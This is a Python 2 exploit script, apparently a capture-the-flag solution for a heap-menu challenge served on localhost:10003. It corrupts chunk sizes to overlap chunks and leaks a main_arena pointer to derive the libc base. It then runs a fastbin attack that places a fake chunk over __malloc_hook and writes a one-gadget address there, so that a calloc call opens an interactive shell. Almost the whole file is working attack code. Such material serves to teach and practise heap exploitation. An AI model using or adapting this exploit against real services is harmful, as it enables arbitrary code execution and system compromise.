#  -*- coding: utf-8 -*-
import telnetlib
import struct
from socket import *


def p64(x): return struct.pack("<Q", x)


def up64(x): return struct.unpack("<Q", x)[0]


def interactive(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def recv_until(s, ch):
    data = ""
    while ch not in data:
        data += s.recv(1)
    return data


def recv_line(s):
    return recv_until(s, '\n')


def alloc(s, size):
    s.send("1\n")
    s.send(str(size) + "\n")
    recv_until(s, "Allocate Index ")

    print "[alloc] idx : " + recv_line(s)[0:-1] + " size : " + str(size)


def fill(s, idx, size, content):
    s.send("2\n")
    s.send(str(idx) + "\n")
    s.send(str(size) + "\n")
    s.send(content + "\x00" * (size - len(content)))

    print "[fill] idx : " + str(idx) + " size : " + str(size)
    print "content : " + repr(content)


def free(s, idx):
    s.send("3\n")
    s.send(str(idx) + "\n")

    print "[free] idx : " + str(idx)


def dump(s, idx):
    s.send("4\n")
    s.send(str(idx) + "\n")
    recv_until(s, "Content: \n")
    dumped = recv_line(s)[0:-1]

    print "[dump] idx : " + str(idx)
    return dumped

s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 10003))

alloc(s, 8)     # chunk size : 32, offset : 0, idx : 0
alloc(s, 8)     # chunk size : 32, offset : 32, idx : 1
alloc(s, 504)   # chunk size : 512, offset : 64, idx : 2
alloc(s, 8)     # chunk size : 32, offset : 64 + 512, idx : 3

fill(s, 0, 16 + 8 + 1, "A" * 16 + "\x00" * 8 + "\x40")
#  make the second chunk's size '64'

fill(s, 2, 24 + 1, "\x00" * 24 + "\x40")
# setting the next size to avoid 'free(): invalid next size (fast)'

free(s, 1)      # size 64 chunk has been freed to fastbin[fastbin_idex(64)]
alloc(s, 56)    # chunk size : 64,  offset : 32, idx : 1

fill(s, 1, 24 + 2, "\x00" * 24 + "\x01\x02")
# restore the chunk size (513), since alloation do memset(0),
# if we do not restore, we will face 'free(): invalid pointer'
# we adds PREV_IN_USE bit not to consolidate

free(s, 2)      # the chunk has been freed to the unsorted bin

dumped = dump(s, 1)     # dumps the fd of the freed chunk (513)
# and it turns out to be the main arena's address
print repr(dumped)
p_normal_bins = up64(dumped.split("\x01\x02" + "\x00" * 6)[1][0:8]) + 0x10
p_main_arena = p_normal_bins - 0x68
print hex(p_normal_bins)

offset_normal_bins = 0x3c4b88
offset_magic_gadget = 0x4526a
libc = p_normal_bins - offset_normal_bins
p_magic_gadget = libc + offset_magic_gadget

alloc(s, 504)   # chunk size : 512, offset : 64, idx : 2
# to remove the chunk from the unsorted bin

# --------------------------------------------------------- #

alloc(s, 8)    # chunk size : 32, offset : x, idx : 4
alloc(s, 0x70 - 0x8)    # chunk size : 0x70, offset : x + 32, idx : 5
free(s, 5)      # size 0x70 chunk has been freed to fastbin
raw_input("asdf")
content = p64(0) + p64(0x70) + p64(p_main_arena - 0x30 - 0x3)
fill(s, 4, 16 + 8 + 8 + 8, "A" * 16 + content)

alloc(s, 0x70 - 0x8)    # chunk size : 0x70, offset : x + 32, idx : 5
# Now, fake chunk (for malloc hook) is in the fastbin
alloc(s, 0x70 - 0x8)    # chunk size : 0x70, fake chunk, idx : 6

fill(s, 6, 3 + 16 + 8, "a" * 19 + p64(p_magic_gadget))

# calls calloc() that calls __malloc_hook()
s.send("1\n")
s.send("8\n")
interactive(s)
